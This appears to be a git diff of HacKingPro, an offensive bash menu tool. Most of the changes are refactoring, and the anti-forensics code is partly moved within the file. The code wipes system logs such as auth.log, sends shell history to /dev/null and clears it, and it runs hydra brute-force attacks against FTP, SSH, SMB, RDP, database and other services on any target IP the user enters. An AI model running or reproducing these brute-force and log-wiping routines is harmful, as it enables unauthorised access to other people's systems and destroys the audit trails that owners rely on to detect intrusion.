@@ -10,7 +10,7 @@
 # Name : Anlominus ~ HacKingPro
 # Description : HacKingPro ~ enter your target and Hack Him in the end get Markdown Report.
 # Created Date : 2022 May
-# Last UPDATE : Tue Jul  5 13:34:42 IDT 2022
+# [ Last UPDATE ] ──╼ [ 13-07-2022 ]
 # Aouther: Anlominus ~> RhytMix ~> HacKingPro
 # Skils: Best Copywriter IN the COSMOS!
 # BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE GREAT SCRIPTS
@@ -18,7 +18,7 @@
 # Location: Made With LOVE IN ISRAEL !
 # Source: https://github.com/Anlominus/HacKingPro
 ###############################################
-LastUPDATE="2022 July 12"
+LastUPDATE="2022 July 13"
 ToolSource="https://github.com/Anlominus/HacKingPro"
 ###############################################
 
@@ -120,6 +120,7 @@ CheckPWD
 CoverMe(){
 
   LOGS_FILES=(
+  ~/.zsh_sessions/*
   /var/log/messages # General message and system related stuff
   /var/log/auth.log # Authenication logs
   /var/log/kern.log # Kernel logs
@@ -202,14 +203,14 @@ CoverMe(){
       }
 
       enableHistory () {
-        if [[ -L ~/.bash_history ]]; then
+        if [ -L ~/.bash_history ]; then
           echo " "
           rm -rf ~/.bash_history
           echo "" > ~/.bash_history
           echo "[+] Disabled sending history to /dev/null"
         fi
 
-        if [[ -L ~/.zsh_history ]]; then
+        if [ -L ~/.zsh_history ]; then
           echo " "
           rm -rf ~/.zsh_history
           echo "" > ~/.zsh_history
@@ -377,118 +378,6 @@ CoverMe(){
           done
         }
 
-    isRoot () {
-            if [ "$EUID" -ne 0 ]; then
-                    return 1
-            fi
-    }
-
-    disableAuth () {
-            if [ -w /var/log/auth.log ]; then
-                    ln /dev/null /var/log/auth.log -sf
-                    echo "[+] Permanently sending /var/log/auth.log to /dev/null"
-            else
-                    echo "[!] /var/log/auth.log is not writable! Retry using sudo."
-            fi
-    }
-
-    disableHistory () {
-            ln /dev/null ~/.bash_history -sf
-            echo "[+] Permanently sending bash_history to /dev/null"
-
-            if [ -f ~/.zsh_history ]; then
-                    ln /dev/null ~/.zsh_history -sf
-                    echo "[+] Permanently sending zsh_history to /dev/null"
-            fi
-
-            export HISTFILESIZE=0
-            export HISTSIZE=0
-            echo "[+] Set HISTFILESIZE & HISTSIZE to 0"
-
-            set +o history
-            echo "[+] Disabled history library"
-
-            echo
-            echo "Permenently disabled bash log."
-    }
-
-    enableAuth () {
-            if [ -w /var/log/auth.log ] && [ -L /var/log/auth.log ]; then
-                    rm -rf /var/log/auth.log
-                    echo "" > /var/log/auth.log
-                    echo "[+] Disabled sending auth logs to /dev/null"
-            else
-                    echo "[!] /var/log/auth.log is not writable! Retry using sudo."
-            fi
-    }
-
-    enableHistory () {
-            if [[ -L ~/.bash_history ]]; then
-                    rm -rf ~/.bash_history
-                    echo "" > ~/.bash_history
-                    echo "[+] Disabled sending history to /dev/null"
-            fi
-
-            if [[ -L ~/.zsh_history ]]; then
-                    rm -rf ~/.zsh_history
-                    echo "" > ~/.zsh_history
-                    echo "[+] Disabled sending zsh history to /dev/null"
-            fi
-
-            export HISTFILESIZE=""
-            export HISTSIZE=50000
-            echo "[+] Restore HISTFILESIZE & HISTSIZE default values."
-
-            set -o history
-            echo "[+] Enabled history library"
-
-            echo
-            echo "Permenently enabled bash log."
-    }
-
-    clearLogs () {
-      for i in "${LOGS_FILES[@]}"
-      do
-        if [ -f "$i" ]; then
-          if [ -w "$i" ]; then
-            read -p "$Press_ENTER"
-            echo "" > "$i"
-            echo "[+] $i cleaned."
-          else
-            echo "[!] $i is not writable! Retry using sudo."
-          fi
-        elif [ -d "$i" ]; then
-          if [ -w "$i" ]; then
-            rm -rf "${i:?}"/*
-            echo "[+] $i cleaned."
-          else
-            echo "[!] $i is not writable! Retry using sudo."
-          fi
-        fi
-      done
-    }
-
-    clearHistory () {
-            if [ -f ~/.zsh_history ]; then
-                    echo "" > ~/.zsh_history
-                    echo "[+] ~/.zsh_history cleaned."
-            fi
-
-            echo "" > ~/.bash_history
-            echo "[+] ~/.bash_history cleaned."
-
-            history -c
-            echo "[+] History file deleted."
-
-            echo
-            echo "Reminder: your need to reload the session to see effects."
-            echo "Type exit to do so."
-    }
-
-    exitTool () {
-            exit 1
-    }
-
     clear # Clear output
 
     # "now" option
@@ -500,19 +389,19 @@ CoverMe(){
 
     MainMenu
 
-    if [[ $option == 1 ]]; then
+    if [ $option == 1 ]; then
             # Clear logs & current history
             clearLogs
             clearHistory
-    elif [[ $option == 2 ]]; then
+    elif [ $option == 2 ]; then
             # Permenently disable auth & bash log
             disableAuth
             disableHistory
-    elif [[ $option == 3 ]]; then
+    elif [ $option == 3 ]; then
             # Restore default settings
             enableAuth
             enableHistory
-    elif [[ $option == 99 ]]; then
+    elif [ $option == 99 ]; then
             # Exit tool
             exitTool
     else
@@ -806,7 +695,7 @@ BruteForce(){
       sleep 1
       hydra -C $ftp_up ${targetIP} ftp -e ns -o Output/${targetIP}/ftp_${targetIP}.txt -I -V -t $thread
       hydra -L $ftp_u -P $ftp_p ${targetIP} ftp -e ns -o Output/${targetIP}/ftp1_${targetIP}.txt -I -V -t $thread
-      Finished_Brute ${targetIP}
+      Finished_Brute "${targetIP}"
     else
       echo "        ${BBlue}┌──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 21(FTP) is not open. Skipping to next port..."
       BruteFTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
@@ -826,7 +715,7 @@ BruteForce(){
 		  hydra -C $ssh_up ${targetIP} ssh -e ns -o Output/${targetIP}/ssh_${targetIP}.txt -I -V -t $thread
       hydra -L $ssh_u -P $ssh_p ${targetIP} ssh -e ns -o Output/${targetIP}/ssh1_${targetIP}.txt -I -V -t $thread
 		  hydra -L $user -p $pass ssh -e ns -o Output/${targetIP}/ssh2_${targetIP}.txt -I -V -t $thread
-      Finished_Brute ${targetIP}
+      Finished_Brute "${targetIP}"
     else
       BruteSSH_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 22(SSH) is not open. Skipping to next port...")"
       AfterBruteSSH="${BruteSSH_Close}"
@@ -843,9 +732,9 @@ BruteForce(){
       echo "${AfterBruteTelnet}"
       sleep 1
       hydra -C $telnet_up ${targetIP} telnet -e ns -o Output/${targetIP}/telnet_${targetIP}.txt -I -V -t $thread
-      hydra -L $telnet_u -P $telnet_p ${targetIP} telnet -e ns -o Output/${targetIP}/telnet1_${targetIP}.txt -I -V -t $thread
+      hydra -L "$telnet_u" -P "$telnet_p" "${targetIP}" telnet -e ns -o Output/"${targetIP}"/telnet1_"${targetIP}".txt -I -V -t $thread
       hydra -L $user -P $pass ${targetIP} telnet -e ns -o Output/${targetIP}/telnet2_${targetIP}.txt -I -V -t $thread
-      Finished_Brute ${targetIP}
+      Finished_Brute "${targetIP}"
     else
       BruteTelnet_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 23(Telnet) is not open. Skipping to next port...")"
       AfterBruteTelnet="${BruteTelnet_Close}"
@@ -864,7 +753,7 @@ BruteForce(){
       hydra -L $user -P $pass ${targetIP} smtp-enum -e ns -o Output/${targetIP}/smtp-enum_${targetIP}.txt -I -V -t $thread
 	    hydra -L $smtp_u -P $smtp_p ${targetIP} smtp -e ns -o Output/${targetIP}/smtp_${targetIP}.txt -I -V -t $thread
       hydra -L $user -P $pass ${targetIP} smtp -e ns -o Output/${targetIP}/smtp1_${targetIP}.txt -I -V -t $thread
-      Finished_Brute ${targetIP}
+      Finished_Brute "${targetIP}"
     else
       BruteSMTP_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 25(SMTP) is not open. Skipping to next port...")"
       AfterBruteSMTP="${BruteSMTP_Close}"
@@ -883,7 +772,7 @@ BruteForce(){
      echo ""
 	   sleep 1
 	   hydra -L $user -P $pass ${targetIP} service http-get -o Output/${targetIP}/http-get_${targetIP}.txt -I -V / -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
 
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 80(HTTP) is not open. Skipping to next port..."
@@ -900,7 +789,7 @@ BruteForce(){
 	   sleep 1
 	   hydra -L $pop_u -P $pop_p ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_${targetIP}.txt -I -V -t $thread
 	   hydra -L $user -P $pass ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_1_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 110(POP3) is not open. Skipping to next port..."
    fi
@@ -910,7 +799,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 139(SMB) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $windows_u -P $pass ${targetIP} smb -S 139 -e ns -o Output/${targetIP}/smb_139_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 139(SMB) is not open. Skipping to next port..."
    fi
@@ -920,7 +809,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 162(SNMP) is open. Starting bruteforce..."
      sleep 1
      hydra -P $snmp snmp -S 162 -e ns -o Output/${targetIP}/snmp_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 162(SNMP) is not open. Skipping to next port..."
    fi
@@ -931,7 +820,7 @@ BruteForce(){
      sleep 1
 		 hydra -L $windows_u -P $pass ${targetIP} service ldap2 -S 389 -e ns -o Output/${targetIP}/ldap2_${targetIP}.txt -I -V -t $thread
 		 hydra -L $windows_u -P $pass ${targetIP} service ldap3 -S 389 -e ns -o Output/${targetIP}/ldap3_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 389(LDAP) is not open. Skipping to next port..."
    fi
@@ -941,7 +830,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 443(HTTPS) is open. Starting bruteforce...\n"
 		 sleep 1
 		 hydra -l $user -P $pass ${targetIP} service https-get -s 443 -o Output/${targetIP}/https-get_${targetIP}.txt -I -V -m / -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 443(HTTPS) is not open. Skipping to next port..."
    fi
@@ -951,7 +840,7 @@ BruteForce(){
      sleep 1
 		 hydra -C $windows_up ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_${targetIP}.txt -I -V -t $thread
 		 hydra -L $windows_u -P $pass ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_2_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 445(SMB) is not open. Skipping to next port..."
    fi
@@ -960,7 +849,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 512(rexec) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $user -P $pass ${targetIP} rexec -S 512 -e ns -o Output/${targetIP}/rexec_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 512(rexec) is not open. Skipping to next port..."
    fi
@@ -969,7 +858,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 513(rlogin) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $user -P $pass ${targetIP} rlogin -S 513 -e ns -o Output/${targetIP}/rlogin_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 513C(rlogin) is not open. Skipping to next port..."
    fi
@@ -978,7 +867,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 514(rsh) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $user -P $pass ${targetIP} rsh -S 514 -e ns -o Output/${targetIP}/rsh_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(rsh) is not open. Skipping to next port..."
    fi
@@ -987,7 +876,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 993(IMAP) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $user -P $pass ${targetIP} imap -S 993 -e ns -o Output/${targetIP}/imap_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 993(IMAP) is not open. Skipping to next port..."
    fi
@@ -997,7 +886,7 @@ BruteForce(){
      sleep 1
      hydra -C $mssql_up ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_${targetIP}.txt -I -V -t $thread
      hydra -L $windows_u -P $pass ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_1_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1433(mssql) is not open. Skipping to next port..."
    fi
@@ -1006,7 +895,7 @@ BruteForce(){
      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1521(oracle) is open. Starting bruteforce...\n"
      sleep 1
      hydra -C $oracle_up ${targetIP} oracle -S 1521 -e ns -o Output/${targetIP}/oracle_${targetIP}.txt -I -V -t $thread
-     Finished_Brute ${targetIP}
+     Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1521(oracle) is not open. Skipping to next port..."
    fi
@@ -1016,7 +905,7 @@ BruteForce(){
 		sleep 1
 		hydra -C $mysql_up ${targetIP} mysql -e ns -o Output/${targetIP}/mysql_${targetIP}.txt -I -V -t $thread
 		hydra -L $sql_u -P $sql_p $TARGET mysql -e ns -o Output/${targetIP}/mysql_1_${targetIP}.txt -I -V -t $thread
-    Finished_Brute ${targetIP}
+    Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3306(mysql) is not open. Skipping to next port..."
    fi
@@ -1026,7 +915,7 @@ BruteForce(){
 		sleep 1
 		hydra -C $windows_u ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_${targetIP}.txt -I -V -t $thread
 		hydra -L $windows_u -P $pass ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_1_${targetIP}.txt -I -V -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3389(RDP) is not open. Skipping to next port..."
    fi
@@ -1035,7 +924,7 @@ BruteForce(){
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5432(postgres) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -C $postgres_up ${targetIP} postgres -e ns -o Output/${targetIP}/postgres_1_${targetIP}.txt -I -V -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5432(postgres) is not open. Skipping to next port..."
    fi
@@ -1045,7 +934,7 @@ BruteForce(){
 		sleep 1
 		hydra -P $vnc_p ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_${targetIP}.txt -I -V -t $thread
 		hydra -P $pass ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_1_${targetIP}.txt -I -V -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5900(VNC) is not open. Skipping to next port..."
    fi
@@ -1055,7 +944,7 @@ BruteForce(){
 		sleep 1
 		hydra -P $vnc_p ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
 		hydra -P $pass ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5901(VNC) is not open. Skipping to next port..."
    fi
@@ -1064,7 +953,7 @@ BruteForce(){
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 6667(IRC) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -L $user -P $pass ${targetIP} irc -s 6667 -e ns -o Output/${targetIP}/irc_${targetIP}.txt -I -V -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 6667(IRC) is not open. Skipping to next port..."
    fi
@@ -1073,7 +962,7 @@ BruteForce(){
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -L $user -P $pass ${targetIP} http-head -s 8000 -f -q -e ns -o Output/${targetIP}/http-head_8000_${targetIP}.txt -I -V -m / -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(HTTP HEAD) is not open. Skipping to next port..."
    fi
@@ -1082,7 +971,7 @@ BruteForce(){
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -L $user -P $pass ${targetIP} http-head -S 8080 -f -q -e ns -o Output/${targetIP}/http-head_8080_${targetIP}.txt -I -V -m / -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8080(HTTP HEAD) is not open. Skipping to next port..."
    fi
@@ -1091,7 +980,7 @@ BruteForce(){
     echo "        ${BBlue}└──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
 		sleep 1
     hydra -L $user -P $pass ${targetIP} http-head -S 8100 -f -q -e ns -o Output/${targetIP}/http-head_8100_${targetIP}.txt -I -V -m / -t $thread
-		Finished_Brute ${targetIP}
+		Finished_Brute "${targetIP}"
    else
     echo "        ${BBlue}└──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8100(HTTP HEAD) is not open. Quitting..."
    fi
@@ -1243,7 +1132,7 @@ AttacKing(){
         # statements
         cd Orusula
         if [ -e "Orusula.py" ]; then
-          python3 Orusula.py -u https://$targetDns
+          python3 Orusula.py -u https://"$targetDns"
           read -p "$Press_ENTER"
           cd $xMenu03
         fi
@@ -1345,7 +1234,7 @@ ReadTargetNameFromtheUser(){
   # This Variable is for Case Name.
   t0="$(echo "\n          ${BBlue}┌──[ 🎯 ]──[${BRed} Name ${BBlue}]──╼  ")"
   read -p "$t0" targetNAME
-  if [ -z $targetNAME ]; then
+  if [ -z "$targetNAME" ]; then
     #statements
     targetNAME="AnLoMinus"
     # echo "\n\t  ${BRed}[${LGrey}TN${BRed}]${BBlue} - ${LGrey}Target Name ${BBlue} $targetNAME\n"
@@ -1364,7 +1253,7 @@ ReadTargetNameFromtheUser(){
   # This Variable is for Case Name.
   t0="$(echo "\n          ${BBlue}┌──[ 🎯 ]──[${BRed} Name ${BBlue}]──╼  ")"
   read -p "$t0" targetNAME
-  if [ -z $targetNAME ]; then
+  if [ -z "$targetNAME" ]; then
     #statements
     targetNAME="AnLoMinus"
     # echo "\n\t  ${BRed}[${LGrey}TN${BRed}]${BBlue} - ${LGrey}Target Name ${BBlue} $targetNAME\n"
@@ -1377,7 +1266,7 @@ ReadTargetIPFromtheUser(){
 # This Variable is for AttacKing ~> IP Addresses .
 t1="$(echo "\n          ${BBlue}|──[ 🎯 ]──[${BRed} IP ${BBlue}]──╼  ")"
 read -p "$t1" targetIP
-if [ -z $targetIP ]; then
+if [ -z "$targetIP" ]; then
   #statements
   targetIP="127.0.0.1"
   # targetIP=" "
@@ -1391,7 +1280,7 @@ ReadTargetURLFromtheUser(){
 # This Variable is for OSINT and AttacKing ~> URL / Domain / Dns / Server/ Websites .
 t2="$(echo "\n          ${BBlue}|──[ 🎯 ]──[${BRed} URL ${BBlue}]──╼  ")"
 read -p "$t2" targetDns
-if [ -z $targetDns ]; then
+if [ -z "$targetDns" ]; then
   #statements
   targetDns="xXx.AnLoMinus.xXx"
   echo "> - ### Target Dns: ${targetDns}" >> ${targetNAME}-HacKingPro-Planning-Log.md
@@ -1418,7 +1307,7 @@ ReadTargetPhoneFromtheUser(){
 # This Variable is for OSINT and AttacKing ~> Phones Numbers .
 t4="$(echo "\n          ${BBlue}└──[ 🎯 ]──[${BRed} Phone (With Country Code) ${BBlue}]──╼  ")"
 read -p "$t4" targetPhone
-if [ -z $targetPhone ]; then
+if [ -z "$targetPhone" ]; then
   #statements
   targetPhone="9720506933037"
   # echo "\n${BRed}[${LGrey}TP${BRed}]${BBlue} - ${LGrey}Target Phone ${BBlue} $targetPhone\n"
@@ -1458,7 +1347,7 @@ HacKingProPlanning(){
 
   # Recommended Open With `Atom` Editor For Normal View.
   echo "# Recommended Open With [Atom]() or [Obsidian]() Editor For Normal View." >> ${targetNAME}-HacKingPro-Planning-Log.md
-  echo "### $targetNAME Case Date: `date`" >> ${targetNAME}-HacKingPro-Planning-Log.md
+  echo "### $targetNAME Case Date: $(date)" >> ${targetNAME}-HacKingPro-Planning-Log.md
   echo "> - ### Target Name: ${targetNAME}" >> ${targetNAME}-HacKingPro-Planning-Log.md
 
   ReadTargetIPFromtheUser
@@ -1597,26 +1486,26 @@ Check_System() {
   if [ -e /data/data/com.termux/files/usr/bin/pkg ]; then
   pac="pkg"
   system="termux"
-  elif [ `command -v brew` ]; then
+elif [ $(command -v brew) ]; then
     pac="brew"
     system="mac"
     sudo=""
-  elif [ `command -v apt` ]; then
+  elif [ $(command -v apt) ]; then
     pac="apt"
     system="linux"
-  elif [ `command -v apt-get` ]; then
+  elif [ $(command -v apt-get) ]; then
     pac="apt-get"
     system="linux"
-  elif [ `command -v apk` ]; then
+  elif [ $(command -v apk) ]; then
     pac="apk"
     system="linux"
-  elif [ `command -v yum` ]; then
+  elif [ $(command -v yum) ]; then
     pac="yum"
     system="fedora"
   fi
 
   # checking for system root access
-  if [ `command -v sudo` ]; then
+  if [ $(command -v sudo) ]; then
     sudo="sudo"
   else
     sudo=""
@@ -1787,7 +1676,7 @@ xDirectories(){
   xMenuRAT="${XHacKingPro}/Menu/RAT--Remote Access Trojan/"
   xMenuSIP="${XHacKingPro}/Menu/SIP--Session Initiation Protocol/"
   xMenuWFA="${XHacKingPro}/Menu/WFA--FireWall Applications/"
-  xMenuKoTH="${XHacKingPro}/Menu/KoTH--King of The Hill/"
+  # xMenuKoTH="${XHacKingPro}/Menu/KoTH--King of The Hill/"
 
   # Checking Directories of HacKingPro TooL
 
@@ -1832,10 +1721,10 @@ Arsenal(){
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Runnin  \n"
     ./run
   fi
-  if [[ -d $HOME/opt/anaconda3/bin/arsenal ]]; then
+  if [ -d $HOME/opt/anaconda3/bin/arsenal ]; then
     #statements
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Installed  \n"
-    break
+    return
   else
     #statements
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Creating Folder Arsenal \n"
@@ -1850,7 +1739,7 @@ Arsenal(){
     python3 -m pip install -r requirements.txt
     echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Run Installation  \n"
     ./run
-    if [[ $? == 1 ]]; then
+    if [ $? == 1 ]; then
       #statements
       echo "\n\t\t ${BRed}[${LGrey}CS${BRed}]${BBlue} - ${BYellow}Arsenal Installation ${BRed} ERROR  \n"
     fi
@@ -1924,7 +1813,7 @@ AlternativeMenu(){
       test )
       clear
       DoSomething=$(arp -a)
-      PrintSomeThing=$(echo "\n\n`date`\n\n$DoSomething" )
+      PrintSomeThing=$(echo "\n\n$(date)\n\n$DoSomething" )
       echo "$PrintSomeThing"
       read -p "$Press_ENTER"
       ;;
@@ -1954,6 +1843,14 @@ AlternativeMenu(){
 # HacKingPro Main Menu
 MainMenu(){
   while true; do
+    # if [ -z "$ArsenalCommand" ]; then
+      # # statements
+      # ArsenalCommand=""
+    # else
+      # echo "Running in new terminal"
+      # (ttab -w $ArsenalCommand)
+      # read -p "$Press_ENTER"
+    # fi
     cd "$XHacKingPro"
   #statements
   clear
@@ -2038,7 +1935,7 @@ MainMenu(){
       test )
       clear
       DoSomething=$(arp -a)
-      PrintSomeThing=$(echo "\n\n`date`\n\n$DoSomething" )
+      PrintSomeThing=$(echo "\n\n$(date)\n\n$DoSomething" )
       echo "$PrintSomeThing"
       read -p "$Press_ENTER"
       ;;
@@ -2082,10 +1979,7 @@ MainMenu(){
 
     ${DGrey}┌──${BRed}[${BYellow} Anonimity ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}── ${BRed}[${DGrey} WhoAmI-Project ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} 02 ${BRed}]${BGreen}── ${BRed}[${DGrey} Nullog ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} 03 ${BRed}]${BGreen}── ${BRed}[${DGrey} MacChanger ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} 04 ${BRed}]${BGreen}── ${BRed}[${DGrey} CoverMyAss ${BRed}]
+    ${DGrey}|──${BRed}[${BWhite} 01 ${BRed}]${BGreen}── ${BRed}[${BWhite} Cover Me ${BRed}]${BGreen}── ${BRed}[${BWhite} Clean Logs & History${BRed}]
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
@@ -2096,15 +1990,6 @@ MainMenu(){
     ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Anonymity ${BRed}]${BGreen}──╼ ${BGreen}   ")
           read -p "$HacKingProMenuMain" cmd
           case $cmd in
-            # l )
-            # echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] This is your Current Location \n\t\t ${BGreen}"
-            # pwd
-            # sleep 0.3
-            # echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] ls ${BYellow} 00--Anonymity \n\t\t ${BGreen}"
-            # ls
-            # sleep 0.3
-            # echo "${BYellow}"
-            # ;;
             p|P )
             HacKingProPlanning
             ;;
@@ -2118,43 +2003,12 @@ MainMenu(){
             ;;
             1|01 )
             clear
-            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] cd kali-whoami \n\t\t ${BGreen}"
-            pwd
-            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] ls kali-whoami \n\t\t ${BGreen}"
-            ls
-            cd $xMenu00/WhoAmI-Project
-            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Installing kali-whoami \n\t\t ${BGreen}"
-            ls
-            sleep 1
-            sudo make install
-            read -p "${Press_ENTER}" Som3T1ng
-            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Checking Status \n\t\t ${BGreen}"
-            sleep 1
-            sudo bash kali-whoami --status
-            read -p "${Press_ENTER}" Som3T1ng
-            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Starting kali-whoami \n\t\t ${BGreen}"
-            sleep 1
-            sudo bash kali-whoami --start
-            read -p "${Press_ENTER}" Som3T1ng
-            cd ..
+            CoverMe
             ;;
             2|02 )
             clear
             echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Starting Nullog \n\t\t ${BGreen}"
             sh $xMenu00/Nullog/nullog.sh
-            ;;
-            3|03 )
-            clear
-            cd $xMenu00/MacChanger
-            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Starting MacChanger \n\t\t ${BGreen}"
-            sh macchanger.sh
-            ;;
-            4|04 )
-            clear
-            # cd $xMenu00/CoverMyAss
-            # echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Starting CoverMyAss \n\t\t ${BGreen}"
